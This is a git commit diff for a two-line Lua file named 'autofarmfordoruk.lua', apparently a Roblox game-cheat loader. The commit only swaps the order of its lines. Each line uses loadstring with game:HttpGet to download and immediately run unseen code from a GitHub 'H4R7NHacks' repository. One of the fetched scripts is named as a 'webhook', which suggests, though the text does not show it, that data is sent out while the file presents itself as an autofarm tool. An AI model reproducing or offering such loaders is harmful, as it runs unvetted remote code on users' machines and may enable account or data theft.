77a2ec1404c62e8918506f4b2d06f9d1f1d19676
H4R7N <31387035+H4R7NHacks@users.noreply.github.com>
2025-08-18 19:21:41 +0300

    Update autofarmfordoruk.lua

--- autofarmfordoruk.lua
+++ autofarmfordoruk.lua
@@ -1,2 +1,2 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Scripts/refs/heads/main/favoyunforork.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Scripts/refs/heads/main/bbwebhookforork.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/H4R7NHacks/Scripts/refs/heads/main/favoyunforork.lua"))()
